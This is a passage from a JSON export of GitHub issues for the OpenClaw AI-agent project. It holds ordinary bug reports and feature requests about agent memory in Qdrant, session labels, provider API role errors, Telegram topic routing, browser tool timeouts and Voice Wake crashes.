graphs, etc.)\n\n---\n\n## 🛠️ Implementation Plan\n\n### Phase 1: Core Infrastructure (Week 1-2)\n1. **Qdrant Connector Library**\n   - `memory_store()` and `memory_query()` functions\n   - Embedding integration (Ollama nomic-embed-text or external)\n   - Collection management (create/index if missing)\n\n2. **Automatic Memory Capture**\n   - Hook into message flow (Mattermost, Telegram, etc.)\n   - Store every message with metadata\n   - Background sync (no blocking)\n\n### Phase 2: Intelligent Recall (Week 3)\n1. **Pre-reply Context Injection**\n   - Query Qdrant before agent response\n   - Inject relevant history into system prompt\n   - Token budgeting (don't exceed context)\n\n2. **Session Startup Context**\n   - Load last N days of high-importance memories\n   - Build initial working memory for agent\n\n### Phase 3: Advanced Features (Week 4+)\n1. **Import Existing Memory Files**\n   - Parse `MEMORY.md` and `memory/YYYY-MM-DD.md`\n   - Migrate to Qdrant vectors\n   - Backward compatibility (optional: keep MD sync)\n\n2. **Memory Insights UI**\n   - Dashboard to browse agent memory\n   - Search/visualize agent knowledge\n   - Manual curation interface\n\n---\n\n## ⚠️ Considerations\n\n### Security\n- **Qdrant should run locally** (`127.0.0.1` only, internet-facing optional)\n- **API Key required** - Never expose memory without auth\n- **Encryption at rest** - Qdrant supports encrypted storage\n\n### Performance\n- **Embedding cost** - Running local model (nomic-embed-text) adds ~50-100ms per message\n- **Query latency** - Qdrant is extremely fast (<10ms for typical queries)\n- **Storage** - 10M messages ≈ 100GB with embeddings (acceptable for most users)\n\n### Backward Compatibility\n- **Existing memory files** - Should be optional migration\n- **Hybrid mode** - Allow both MD and Qdrant in parallel\n- **Graceful degradation** - If Qdrant down, fallback to file-based memory\n\n### Cost\n- **Qdrant** - Open source, free (local hosting)\n- **Embedding model** - Can use Ollama (free) or API (OpenAI/Anthropy)\n- **Storage** - Minimal (<100MB for most users)\n\n---\n\n## 🎯 Success Criteria\n\n- [ ] Agent remembers conversations from previous sessions without manual prompting\n- [ ] Semantic search returns relevant historical context\n- [ ] No measurable performance degradation in normal operations\n- [ ] Migration path from MD files to Qdrant (import/restore)\n- [ ] Security: Qdrant not exposed to internet by default\n\n---\n\n## 🚀 Future Enhancements\n\n- **Memory summarization** - Auto-generate daily/weekly summaries\n- **Cross-agent memory sharing** - Federated knowledge across agents\n- **Memory pruning** - Auto-remove irrelevant or old memories\n- **Memory export** - Backup/restore agent brains\n- **Memory analytics** - Visualize agent learning patterns\n- **Hybrid with RAG** - Combine agent memory with external knowledge bases\n\n---\n\n## 📚 Additional Notes\n\n### Comparison with Alternatives\n\n| Solution | Pros | Cons |\n|----------|------|------|\n| **Qdrant** (proposed) | Semantic search, Rust fast, mature, small footprint | Requires embedding model |\n| Redis | Ultra simple, fast, familiar | No semantic search, just key-value |\n| Supabase + pgvector | Relational + vectors, managed | Heavier, external dependency |\n| Pinecone | Managed, easy | Paid, not self-hosted |\n| Plain text files (current) | Simple, transparent | No search, no continuity |\n\n---\n\n**Tags:** `memory`, `qdrant`, `ai-agent`, `feature-request`, `semantic-search`\n\n---\n\n*This feature is critical for OpenClaw to move from \"stateless agents\" to \"persistent intelligent assistants\".*",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14049",
      "createdAt": "2026-02-11T11:10:22Z",
      "updatedAt": "2026-02-11T11:10:22Z",
      "author": "gamersalpha",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "web-ui",
          "config"
        ]
      }
    },
    {
      "number": 14048,
      "title": "[Bug]: Session \"Label\" lost after /new or /reset",
      "body": "## Summary\n\nLabels defined for a Session are cleared upon refresh.\n\n## Steps to reproduce\n\n1. Configure a Label for a Session\n2. Then refresh the session using `/new` or `/reset`.\n3. A new session with the same key is created, but the label is cleared.\n\n## Expected behavior\n\nWhen refreshing a session with the same key, the label should be retained (or inherited).\n\n## Actual behavior\n\nLabels were abandoned as the Session was updated.\n\n## Environment\n\n- OpenClaw version: `2026.2.9`\n- OS: MacOS Tahoe 26.2\n- Install method (pnpm/npx/docker/etc): npm i -g openclaw\n\n## Logs or screenshots\n\nBefore refresh\n\n<img width=\"967\" height=\"112\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/04a2627b-bbea-4a4a-87c7-602c25d2f013\" />\n\nAfter refresh\n\n<img width=\"948\" height=\"103\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/4a76deb9-dffd-4d50-bc68-2f02aae931dc\" />\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14048",
      "createdAt": "2026-02-11T11:07:26Z",
      "updatedAt": "2026-02-11T11:07:44Z",
      "author": "cxbig",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "docker"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 14047,
      "title": "[Feature]: support a \"reasoningDefault\" entry in openclaw.json",
      "body": "## Summary\n\nWhen a new session is started, the option /reasoning is always off. I'd like to have the possibility to have it switched on by default.\n\n## Proposed solution\n\nSupport a entry in openclaw.json \"reasoningDefault\" so that I can set the default value for the /reasoning.\n\n## Alternatives considered\n\nno\n\n## Additional context\n\nnone\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14047",
      "createdAt": "2026-02-11T11:05:28Z",
      "updatedAt": "2026-02-11T11:05:28Z",
      "author": "klauslochmann",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 14046,
      "title": "[Bug]:ANNOUNCE_SKIP not working in agent-to-agent announce step",
      "body": "## Description\n\nWhen using `sessions_send` for agent-to-agent communication, the target agent correctly replies `ANNOUNCE_SKIP` during the announce step, but the message is still delivered to the user's chat.\n\n## Steps to Reproduce\n\n1. Agent A calls Agent B via `sessions_send`\n2. Agent B completes the primary reply\n3. System sends `\"Agent-to-agent announce step.\"` to Agent B\n4. Agent B replies exactly `ANNOUNCE_SKIP`\n5. **Expected**: No announce message sent to user\n6. **Actual**: Message is still sent to user's chat (duplicate)\n\n## Evidence\n\nFrom `sessions_history` of the target agent:\n\n```json\n{\n  \"role\": \"user\",\n  \"content\": [{\"type\": \"text\", \"text\": \"Agent-to-agent announce step.\"}]\n},\n{\n  \"role\": \"assistant\", \n  \"content\": [{\"type\": \"text\", \"text\": \"ANNOUNCE_SKIP\"}]\n}",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14046",
      "createdAt": "2026-02-11T11:04:41Z",
      "updatedAt": "2026-02-11T11:04:41Z",
      "author": "theathonds",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 14044,
      "title": "[Feature]: Integration onchain",
      "body": "I am a  solana rust infra dev. I am going to integration openclaw with onchain program\nis it possible or any guide and example?\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14044",
      "createdAt": "2026-02-11T10:59:42Z",
      "updatedAt": "2026-02-11T10:59:42Z",
      "author": "roswelly",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 13520,
      "title": "fix(web-search): Grok provider returns 'No response' due to response format mismatch",
      "body": "## Problem\n\nThe Grok web_search provider returns `\"No response\"` even though the xAI API returns valid data.\n\n## Root Cause\n\nThe xAI /v1/responses API returns data in a different format than expected:\n\n**Expected (current code):**\n```json\n{\n  \"output_text\": \"...\",\n  \"citations\": [...]\n}\n```\n\n**Actual xAI response:**\n```json\n{\n  \"output\": [\n    {\n      \"type\": \"message\",\n      \"content\": [\n        {\n          \"type\": \"output_text\",\n          \"text\": \"Hello! How's it going?\",\n          \"annotations\": [\n            {\"type\": \"url_citation\", \"url\": \"...\", \"start_index\": 0, \"end_index\": 10}\n          ]\n        }\n      ]\n    }\n  ]\n}\n```\n\n## Fix\n\nUpdate `runGrokSearch` in `src/agents/tools/web-search.ts` to handle both formats:\n\n```typescript\nconst data = (await res.json()) as GrokSearchResponse;\n\n// Extract text from the new response format\nlet content = data.output_text ?? \"\";\nlet citations: string[] = data.citations ?? [];\nlet inlineCitations = data.inline_citations;\n\n// Handle the new xAI /v1/responses format\nif (!content && data.output?.length) {\n  const message = data.output.find((o) => o.type === \"message\");\n  if (message?.content?.length) {\n    const textContent = message.content.find((c) => c.type === \"output_text\");\n    if (textContent?.text) {\n      content = textContent.text;\n    }\n    // Extract citations from annotations\n    if (textContent?.annotations?.length && !citations.length) {\n      const urlCitations = textContent.annotations\n        .filter((a) => a.type === \"url_citation\" && a.url)\n        .map((a) => a.url as string);\n      citations = [...new Set(urlCitations)];\n    }\n  }\n}\n\nif (!content) {\n  content = \"No response\";\n}\n```\n\n## Tested\n\n- Direct curl to xAI API works and returns expected format\n- With this fix applied locally, responses parse correctly\n\n## Environment\n\n- OpenClaw: 2026.2.9\n- xAI API: /v1/responses endpoint\n- Model: grok-4-1-fast",
      "state": "closed",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13520",
      "createdAt": "2026-02-10T16:40:59Z",
      "updatedAt": "2026-02-11T10:59:08Z",
      "author": "higginsvott",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 14036,
      "title": "[Bug]: models/gemini-1.5-flash is not found for API version v1beta, or is not supported for            generateContent. Call ListModels to see the list of available models and their supported methods.",
      "body": "## Summary\n\nWhat went wrong?\nmodels/gemini-1.5-flash is not found for API version v1beta, or is not supported for          \n generateContent. Call ListModels to see the list of available models and their supported methods.\n## Steps to reproduce\n\n1.\n2.\n3.\n\n## Expected behavior\n\nWhat did you expect to happen?\n\n## Actual behavior\n\nWhat actually happened?\n\n## Environment\n\n- Clawdbot version:\n- OS:\n- Install method (pnpm/npx/docker/etc):\n\n## Logs or screenshots\n\nPaste relevant logs or add screenshots (redact secrets).\n",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14036",
      "createdAt": "2026-02-11T10:42:55Z",
      "updatedAt": "2026-02-11T10:55:41Z",
      "author": "yangboyd",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "docker"
        ],
        "components": []
      },
      "commentsData": [
        {
          "id": 3883682166,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/14036#issuecomment-3883682166",
          "createdAt": "2026-02-11T10:55:41Z",
          "updatedAt": "2026-02-11T10:55:41Z",
          "author": "yangboyd",
          "body": "changed a another model"
        }
      ]
    },
    {
      "number": 14040,
      "title": "[Bug]: Dashscope API rejects 'developer' role causing all qwen3-coder-flash requests to fail",
      "body": "# Bug Report: Dashscope API rejects \"developer\" role causing all qwen3-coder-flash requests to fail\n\n## 🐛 Bug Description\n\nWhen using Dashscope provider with `qwen3-coder-flash` model, all API requests fail with the error:\n```\n\"developer is not one of ['system', 'assistant', 'user', 'tool', 'function']\"\n```\n\nThis makes **qwen3-coder-flash completely unusable** through OpenClaw's Dashscope integration.\n\n## 📋 Environment\n\n- **OpenClaw Version**: 2026.2.9 (33c75cb)\n- **OS**: Ubuntu\n- **Model**: qwen3-coder-flash via Dashscope\n- **API Key**: (configured, working when tested directly with curl)\n\n## 🔄 Reproduction Steps\n\n1. Configure Dashscope provider with qwen3-coder-flash model\n2. Send any message to the agent through Feishu, TUI, or any channel\n3. Agent attempts to call Dashscope API\n4. Request fails with the developer role error\n\n## 💥 Actual Behavior\n\n- All messages fail with the same error\n- The agent enters an infinite error loop (retrying the same failing request)\n- Session becomes unusable and must be deleted manually\n\n## ✅ Expected Behavior\n\n- qwen3-coder-flash should work normally (it works perfectly when tested directly with curl)\n- Messages should be sent with valid roles (system, user, assistant, tool, function)\n- The \"developer\" role should not be sent to Dashscope API\n\n## 🔍 Root Cause Analysis\n\n**Dashscope API** only accepts these message roles:\n- ✅ `system`\n- ✅ `assistant`\n- ✅ `user`\n- ✅ `tool`\n- ✅ `function`\n- ❌ `developer` ← **NOT accepted**\n\n**OpenClaw** is sending messages with `role: \"developer\"` to the Dashscope API, which rejects them.\n\n### Direct API Test Results\n\n```bash\n# ✅ Works - Using \"system\" role\ncurl -X POST \"https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions\" \\\n  -H \"Authorization: Bearer sk-...\" \\\n  -d '{\"model\": \"qwen3-coder-flash\", \"messages\": [{\"role\": \"system\", \"content\": \"...\"}, {\"role\": \"user\", \"content\": \"Hello\"}]}'\n\n# ❌ Fails - Using \"developer\" role\ncurl -X POST \"https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions\" \\\n  -H \"Authorization: Bearer sk-...\" \\\n  -d '{\"model\": \"qwen3-coder-flash\", \"messages\": [{\"role\": \"developer\", \"content\": \"...\"}, {\"role\": \"user\", \"content\": \"Hello\"}]}'\n\n# Error: \"developer is not one of ['system', 'assistant', 'user', 'tool', 'function']\"\n```\n\n## 📊 Impact\n\n- **qwen3-coder-flash**: Completely unusable ❌\n- **glm-4.7**: May have the same issue (same Dashscope provider)\n- **deepseek-v3.2**: May have the same issue (same Dashscope provider)\n\n## 🔧 Suggested Fix\n\nOpenClaw should either:\n\n1. **Map \"developer\" role to \"system\" role** when sending to Dashscope provider (recommended)\n   - Many providers accept both roles, treating them as equivalent\n   - This maintains backward compatibility\n\n2. **Filter out \"developer\" role messages** when sending to Dashscope\n   - Less ideal as it may lose context\n\n3. **Add provider-specific role mapping configuration**\n   - Allow users to configure role mappings per provider\n   - More flexible but more complex\n\n## 📁 Affected Code Locations\n\nThe bug likely exists in OpenClaw's message formatting/transformation layer:\n- `/packages/api/src/openai-compat.ts` or similar\n- Message role mapping logic for different providers\n- Dashscope-specific adapter code\n\n## 📝 Session Logs\n\nSession file shows repeated errors:\n```\n{\"type\":\"message\",\"id\":\"ac823107\",...,\"message\":{\"role\":\"assistant\",...,\"errorMessage\":\"developer is not one of ['system', 'assistant', 'user', 'tool', 'function']\"}}\n```\n\nThis error repeats for every message, creating an infinite error loop.\n\n## 🏷️ Labels Suggestion\n\n- bug\n- dashscope\n- provider-integration\n- api-compatibility\n\n## 🔗 Related\n\n- Dashscope API Documentation: https://dashscope.console.aliyun.com/\n- OpenAI-compatible API spec uses different role names than Dashscope",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14040",
      "createdAt": "2026-02-11T10:54:49Z",
      "updatedAt": "2026-02-11T10:54:49Z",
      "author": "dxjjj2008",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "tui",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 14038,
      "title": "[Bug]: Telegram plugin fails on 3rd file: \"Cannot read properties of null (reading '0')\"",
      "body": "**Version:** 2026.2.9\n\n**Bug Description:**\nWhen sending files via Telegram, the 3rd file always fails with error: \"Cannot read properties of null (reading '0')\"\n\n**Reproduction Steps:**\n1. Send 1 file → success\n2. Send 2 more files → 1st success, 2nd fails\nOR\n1. Send 3 files in one message → 1st and 2nd success, 3rd fails\n\n**Tested file types:** txt, yaml\n**Max file size:** 760kb\n**Platform:** Telegram channel\n\n**Additional Notes:**\n- Issue occurs regardless of file type/size\n- Appears to be a session state or array indexing bug\n- /new workaround temporarily resolves until the 3rd file again\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14038",
      "createdAt": "2026-02-11T10:48:58Z",
      "updatedAt": "2026-02-11T10:48:58Z",
      "author": "hbabyl",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 11518,
      "title": "[Bug] browser tool persistent timeout on act (profile=\"openclaw\") despite restarts",
      "body": "### Description\nThe `browser` tool is consistently failing with a timeout error when attempting to perform `act` operations (e.g., `click`) on the managed browser (`profile=\"openclaw\"`). While `open` and `snapshot` occasionally succeed in retrieving the page state, subsequent interaction attempts fail reliably.\nRestarting the gateway (`openclaw gateway restart`) does not resolve the issue.\n\n### Steps to Reproduce\n1. Start OpenClaw Agent.\n2. Call `browser` tool with `action: \"open\"` and `profile: \"openclaw\"`.\n3. Call `browser` tool with `action: \"snapshot\"` (successful).\n4. Call `browser` tool with `action: \"act\"`, `kind: \"click\"`, and a valid `ref`.\n\n### Actual Behavior\nThe tool call hangs for 20 seconds and returns:\n```json\n{\n  \"status\": \"error\",\n  \"tool\": \"browser\",\n  \"error\": \"Can't reach the OpenClaw browser control service (timed out after 20000ms)...\"\n}\n```\n\n### Environment\n- **OS**: macOS (Darwin 24.3.0, arm64)\n- **Node**: v24.13.0\n- **Agent**: Main\n- **Browser Profile**: `openclaw` (Managed)\n\n### Possible Cause\nThe WebSocket connection for the browser control service might be entering a zombie state or failing to re-establish properly after an initial timeout, causing all subsequent command queues to stall until the hard timeout is reached.",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/11518",
      "createdAt": "2026-02-07T23:01:01Z",
      "updatedAt": "2026-02-11T10:43:46Z",
      "author": "peteradams2026",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3865853935,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11518#issuecomment-3865853935",
          "createdAt": "2026-02-08T00:46:13Z",
          "updatedAt": "2026-02-08T00:46:13Z",
          "author": "peteradams2026",
          "body": "### Update: Issue Isolated to Agent Tool Wrapper\n\nI just cross-checked with the CLI (`openclaw browser click <ref> --browser-profile openclaw`) and it **works perfectly**!\n\n**Findings:**\n- **CLI `click`**: Works instantly (`clicked ref e6 on https://example.com/`).\n- **Agent `browser` tool `act: click`**: Times out (20000ms).\n- **Agent `browser` tool `act: evaluate`** (no refs, pure JS): Works!\n\n**Conclusion:**\nThe browser control service and Playwright are healthy. The failure is specific to the agent's `browser` tool implementation, possibly in how it handles `refs`, serializes the `act` request, or manages timeouts (hardcoded 20s vs CLI's working logic)."
        },
        {
          "id": 3883627806,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11518#issuecomment-3883627806",
          "createdAt": "2026-02-11T10:43:46Z",
          "updatedAt": "2026-02-11T10:43:46Z",
          "author": "frUUber",
          "body": "## Can confirm this bug on Ubuntu Linux (x64)\n\n**Environment:**\n- OS: Ubuntu 24.04.3 LTS (Linux 6.17.0-14-generic, x64)\n- Node: v22.22.0\n- OpenClaw: 2026.2.6-3\n- Browser: Google Chrome 144.0.7559.132\n- Gateway Port: 18789\n\n**Symptoms (identical to OP):**\n- ✅ `browser.open()` succeeds\n- ✅ `browser.snapshot()` succeeds (reads page via CDP)\n- ❌ `browser.act()` (click/type) → timeout after 20s\n- ❌ Gateway restart doesn't fix it\n\n**Additional observations:**\n\n1. **Browser Control Service port (18791) never opens:**\n   ```bash\n   $ ss -tlnp | grep openclaw\n   # Only Gateway port 18789 is bound, no port 18791\n   ```\n\n2. **Service reports \"ready\" but isn't reachable:**\n   ```\n   [browser/service] Browser control service ready (profiles=1)\n   ```\n   But tool calls timeout:\n   ```\n   [tools] browser failed: Can't reach the OpenClaw browser control service \n   (timed out after 20000ms)\n   ```\n\n3. **Playwright installation required:**\n   - Initially missing → installed via `npm install playwright` in OpenClaw's node_modules\n   - Browsers installed via `npx playwright install chromium`\n   - Bug persists after installation\n\n**Root cause hypothesis:**\nThe Browser Control Service HTTP server (port 18791) never binds, despite logging \"ready\". The WebSocket endpoint for `act` commands is unreachable because the service isn't listening on the expected port.\n\n**Workaround:**\nUsing the Chrome extension relay (`profile=\"chrome\"`) works as expected for both `snapshot` and `act`."
        }
      ]
    },
    {
      "number": 14034,
      "title": "Voice Wake trigger word changes don’t apply until app restart",
      "body": "## Environment\n- OpenClaw macOS app: 2026.2.9 (build 9194)\n- macOS: 26.2 (25C56)\n\n## Summary\nAfter editing Voice Wake “Trigger words”, the new triggers do not take effect until restarting the OpenClaw app.\n\n## Steps to Reproduce\n1. Open OpenClaw → Settings → Voice Wake\n2. Enable Voice Wake\n3. Change Trigger words (add/remove/edit)\n4. Close settings and try speaking the new trigger\n5. Nothing happens / old triggers still seem active\n6. Restart the app\n7. New triggers now work\n\n## Expected\nTrigger changes should apply immediately, or at least after toggling Voice Wake off/on.\n\n## Actual\nRequires app restart to apply trigger changes reliably.\n\n## Notes\nWake words are stored globally (`~/.openclaw/settings/voicewake.json`) and changes should be propagated, but the macOS wake-word runtime appears not to refresh its active trigger list without restart.\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14034",
      "createdAt": "2026-02-11T10:36:39Z",
      "updatedAt": "2026-02-11T10:36:39Z",
      "author": "komichi32k",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 14033,
      "title": "Voice Wake crashes when wake words contain Japanese/Unicode characters (SIGTRAP in VoiceWakeRuntime.handleRecognition)",
      "body": "## Environment\n- OpenClaw macOS app: 2026.2.9 (build 9194)\n- macOS: 26.2 (25C56)\n- Device: Mac16,10 (Apple Silicon)\n- Voice Wake enabled\n- Recognition language: Japanese (Japan)\n\n## Steps to Reproduce\n1. Open OpenClaw → Settings → Voice Wake\n2. Enable Voice Wake\n3. Set Trigger words to a Japanese string (e.g. `アルフレディア`)\n4. Close settings and speak the wake word (with a short pause after it)\n5. App crashes\n\n## Expected\nVoice Wake should handle Unicode/Japanese triggers without crashing.\n\n## Actual\nApp crashes when wake-word handling runs with Japanese triggers.\n\n## Crash details\n- Crash type: `EXC_BREAKPOINT (SIGTRAP)`\n- Faulting function: `VoiceWakeRuntime.handleRecognition(_:config:)`\n- Stack includes: `specialized Collection.subscript.getter` (suggesting out-of-range indexing)\n\nIncident ID: `53D4E82F-D5B5-42D0-B805-D593D9E5EDB7`\n(Full crash report available on request.)\n\n## Workaround\nASCII-only triggers (e.g. `alf`, `openclaw`) avoid the crash.\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14033",
      "createdAt": "2026-02-11T10:36:29Z",
      "updatedAt": "2026-02-11T10:36:29Z",
      "author": "komichi32k",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 14032,
      "title": "[Bug]: OpenClaw Telegram Topic/Thread Support Broken for Skills and Message Tool",
      "body": "## Summary\nOpenClaw fails to properly support Telegram topic/thread replies for skills and the message tool. Responses are always sent to the \"general\" topic instead of the correct thread, even when `replyTo` parameters are used. The issue can be bypassed by using the Telegram Bot API directly, confirming this is an OpenClaw bug.\n\n## Environment\n- **OpenClaw Version:** 2026.2.9\n- **OS:** Linux 6.12.57+deb12-amd64 (x64)\n- **Node:** v22.22.0\n- **Telegram Configuration:** Supergroup with forum topics enabled\n\n## Configuration\n`openclaw.json` Telegram section (anonymized):\n```json\n\"telegram\": {\n  \"enabled\": true,\n  \"groups\": {\n    \"<CHAT_ID>\": {\n      \"requireMention\": false,\n      \"groupPolicy\": \"open\",\n      \"topics\": {\n        \"7\": {\n          \"requireMention\": false\n        }\n      }\n    }\n  }\n}\n```\n\n## Problem Description\nWhen a skill or agent attempts to reply to a message in a Telegram topic/thread, the response is incorrectly routed to the \"general\" topic instead of staying in the same thread.\n\n### Expected Behavior\n- Skill responses should remain in the same topic/thread as the triggering message\n- `openclaw.tools.message.send()` with `replyTo` parameter should respect thread context\n- Telegram's `reply_to_message_id` should propagate through OpenClaw\n\n### Actual Behavior\n- All skill responses go to \"general\" topic\n- `message` tool with `replyTo` parameter ignores thread context\n- Only direct Telegram Bot API calls work correctly\n\n## Evidence and Testing\n\n### 1. Skill Return Text (FAILS)\n**Code:**\n```javascript\nasync run(context) {\n  return {\n    text: \"Response text\",\n    done: true\n  };\n}\n```\n**Result:** Response goes to \"general\" topic ❌\n\n### 2. Message Tool with replyTo (FAILS)\n**Code:**\n```javascript\nawait openclaw.tools.message.send({\n  session,\n  text: \"Response text\",\n  replyTo: message.id\n});\n```\n**Result:** Response goes to \"general\" topic ❌\n\n### 3. Telegram Bot API Direct Call (WORKS)\n**Code:**\n```javascript\nawait axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {\n  chat_id: chatId,\n  text: \"Response text\",\n  reply_to_message_id: messageId,\n  parse_mode: \"Markdown\"\n});\n```\n**Response from Telegram API:**\n```json\n{\n  \"ok\": true,\n  \"result\": {\n    \"message_id\": 957,\n    \"message_thread_id\": 7,\n    \"is_topic_message\": true,\n    \"reply_to_message\": {\n      \"message_id\": 954,\n      \"message_thread_id\": 7\n    }\n  }\n}\n```\n**Result:** Response correctly stays in topic 7 ✅\n\n## Logs Analysis\nOpenClaw session logs correctly identify the topic:\n```\n\"lane enqueue: lane=session:agent:main:telegram:group:<CHAT_ID>:topic:7\"\n```\n\nHowever, the topic context is not propagated to skill responses or message tool calls.\n\n## Impact\n- **Skills cannot participate in threaded conversations** - Limits utility in forum-style groups\n- **User experience degraded** - Users must manually navigate to \"general\" to see skill responses\n- **Workaround required** - Developers must bypass OpenClaw and use Telegram API directly\n\n## Root Cause Hypothesis\nOpenClaw is not properly handling:\n1. `message_thread_id` from incoming Telegram messages\n2. Propagation of thread context to skill execution environment\n3. `reply_to_message_id` parameter when sending messages via Telegram channel\n\n## Workaround (Current Solution)\nSkills must use Telegram Bot API directly instead of OpenClaw's message tools:\n\n```javascript\n// Instead of OpenClaw message tool\nawait openclaw.tools.message.send({ session, text: \"...\", replyTo: message.id });\n\n// Use Telegram API directly\nawait axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {\n  chat_id: message.chat.id,\n  text: \"...\",\n  reply_to_message_id: message.id,\n  parse_mode: \"Markdown\"\n});\n```\n\n## Recommendations for Fix\n1. **Propagate `message_thread_id`** from incoming Telegram messages to skill context\n2. **Support `reply_to_message_id`** in Telegram channel message sending\n3. **Add thread/topic awareness** to OpenClaw's message routing system\n4. **Update documentation** with examples for topic-aware skill development\n\n## Reproduction Steps\n1. Create a Telegram supergroup with topics enabled\n2. Configure OpenClaw with topic settings\n3. Create a simple skill that responds to a command\n4. Invoke the skill from within a topic thread\n5. Observe response appears in \"general\" instead of the thread\n\n## Related Issues\n- Issue #13667: \"Telegram plugin starts but never polls for updates\" (possibly related)\n\n## Additional Context\nThis bug significantly impacts the usability of OpenClaw in community/forum settings where threaded conversations are essential. The workaround (direct Telegram API calls) adds complexity and reduces portability of skills across different channels.\n\n---\n\n**Status:** Confirmed bug with working workaround  \n**Priority:** High (breaks core functionality in forum-style groups)  \n**Assignee:** OpenClaw Telegram channel maintainer\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14032",
      "createdAt": "2026-02-11T10:34:46Z",
      "updatedAt": "2026-02-11T10:35:31Z",
      "author": "spidgrou",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 14030,
      "title": "[Feature]: New Provider: WrangleAI (Semantic Routing, DLP & Enterprise Governance)",
      "body": "### Summary\nI propose adding **WrangleAI** as a provider. WrangleAI is an OpenAI-compatible middleware that acts as a **Smart Routing & Governance Layer** for OpenClaw agents.\n\nIt allows users to decouple their agent logic from specific model providers, while adding a centralized layer for Data Loss Prevention (DLP), Cost tracking, and Carbon emissions monitoring.\n\n### The Problem\nOpenClaw users face three key challenges when moving to production usage:\n1.  **Safety & Compliance:** There is no standard way to prevent an agent from accidentally leaking PII (secrets, emails) to an external LLM provider.\n2.  **Cost Inefficiency:** Agents often use \"smart\" models (like GPT-4o) for trivial tasks (formatting, simple extraction) because managing per-task routing logic in the agent code is complex.\n3.  **Observability Silos:** Tracking total token usage and carbon footprint across multiple providers (OpenAI, Anthropic, Google) requires aggregating logs from three different dashboards.\n\n### Proposed Solution: The Governance & Routing Layer\nWrangleAI integrates as a single provider endpoint but dynamically manages the downstream execution.\n\n**1. Semantic \"Intensity\" Routing**\nInstead of hardcoding a model, users set `model: \"auto\"`. WrangleAI analyzes the prompt's complexity  in real-time:\n*   **Low Intensity:** Routes low priority tasks to cost-optimized models (e.g., Gemini Flash, Haiku).\n*   **High Intensity:** Routes reasoning/coding tasks to frontier models (e.g., GPT-5.2, Claude Opus 4.6 ).\n*   *Benefit:* Users see an immediate ~40-60% cost reduction on agentic workloads without changing their prompt logic.\n\n**2. Built-in DLP (Data Loss Prevention)**\nWrangleAI inspects every prompt *before* it leaves the secure boundary to reach the LLM.\n*   **Action:** Automatically redacts API Keys, PII, and custom regex patterns.\n*   *Benefit:* Agents can safely interact with sensitive local files/logs without risk of leaking secrets to public model providers.\n\n**3. Sustainability & Usage Tracking**\nReturns standard usage metrics plus **Estimated Carbon Emissions (gCO2eq)** for every request. This data is returned in the response headers/metadata, allowing OpenClaw to display \"Green AI\" metrics to the user.\n\n### Evidence / Usage Scenarios\n\n**Scenario 1: Secure Debugging (DLP)**\n*   **User Task:** \"Analyze this log file for errors.\" (The log contains a live AWS Secret Key).\n*   **Without Wrangle:** The AWS key is sent to OpenAI/Anthropic servers. Compliance violation.\n*   **With Wrangle:** The DLP layer detects the key pattern, replaces it with `[REDACTED_AWS_KEY]`, and *then* forwards the safe log to the model.\n\n**Scenario 2: Efficient 